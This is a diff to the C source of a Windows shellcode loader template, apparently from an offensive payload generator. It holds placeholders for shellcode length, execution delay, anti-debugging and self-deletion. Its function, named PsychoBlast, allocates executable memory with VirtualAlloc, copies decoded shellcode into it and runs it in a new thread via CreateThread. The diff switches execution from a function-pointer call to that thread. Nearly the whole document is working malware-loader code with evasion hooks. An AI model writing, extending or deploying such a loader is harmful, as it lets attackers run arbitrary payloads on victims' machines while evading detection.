@@ -21,6 +21,7 @@
 DWORD WINAPI PsychoBlast(LPVOID lpParameter)
 {
     DWORD dwSize;
+    SIZE_T bytesWritten;
     //HANDLE currentProcess;
 
     int length = ####SHELLCODE_LENGTH####;
@@ -32,13 +33,14 @@ DWORD WINAPI PsychoBlast(LPVOID lpParameter)
 
     //currentProcess = GetCurrentProcess();
 
+    //####DELAY####
     printf("[*] Allocating %d bytes of memory\n", length);
     
     // Method 1: No process Specified 
     VOID* mem = VirtualAlloc(NULL, length, 0x00002000 | 0x00001000, PAGE_EXECUTE_READWRITE);
 
     // Method 2: Specifying current process 
-    //VOID* mem = VirtualAllocEx(currentProcess, NULL, length + 1, 0x00002000 | 0x00001000, PAGE_READWRITE);
+    //VOID* mem = VirtualAllocEx((HANDLE)-1, NULL, length + 1, 0x00002000 | 0x00001000, PAGE_EXECUTE_READWRITE);
     if (mem == NULL)
         return -1;
     //VirtualProtect(mem, length, 0x40, &dwSize);
@@ -49,7 +51,7 @@ DWORD WINAPI PsychoBlast(LPVOID lpParameter)
     success = memcpy(mem, decoded, length);
 
     // Method 2: Specifying current process 
-    // success = WriteProcessMemory(currentProcess, mem, decoded, length, &bytesWritten);
+    // success = WriteProcessMemory((HANDLE)((int)-1), mem, decoded, length, &bytesWritten);
     if (!success){
         printf("[-] Oh gosh, something went wrong!\n");
         return -2;
@@ -58,17 +60,30 @@ DWORD WINAPI PsychoBlast(LPVOID lpParameter)
     int ret_val = 0;
     printf("[*] Executing\n");
     // Method 1: No process Specified, using function pointer
-    //int (*my_main)(char**) = (int(*)(char**)) ((ULONGLONG)mem);
+    // int (*my_main)(char**) = (int(*)(char**)) ((ULONGLONG)mem);
     // With no params, this definition would be good as well
-    ((void(*)())mem)();
+    // ((void(*)(void))mem)();
 
-    //char** args = (char**)lpParameter;
+    // char** args = (char**)lpParameter;
 
-    //ret_val = my_main(args);
-    //free(args);
+    // ret_val = my_main(args);
+    // free(args);
 
     // Method 2: No process specified, using CreateThread
-    //CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, lpParameter, 0, NULL);
+
+
+    DWORD threadID;
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, lpParameter, 0, &threadID);
+    if(NULL == hThread){
+        printf("[-] Could not execute thread!\n");
+        return -2;
+    }else{
+        printf("[+] Started thread %i\n", threadID);
+    }
+    WaitForSingleObject(hThread, INFINITE);
+
+    Sleep(5*1000);
+
 
     // Method 3: Specifying current process
     //CreateRemoteThread(currentProcess, NULL, 0, (LPTHREAD_START_ROUTINE)mem, lpParameter, 0, NULL);
@@ -89,7 +104,6 @@ DWORD WINAPI PsychoBlast(LPVOID lpParameter)
 
 int main()
 {
-    //####DELAY####
     //####ANTIDEBUG####
     //####ARGS####
     //####SELF_DELETE####
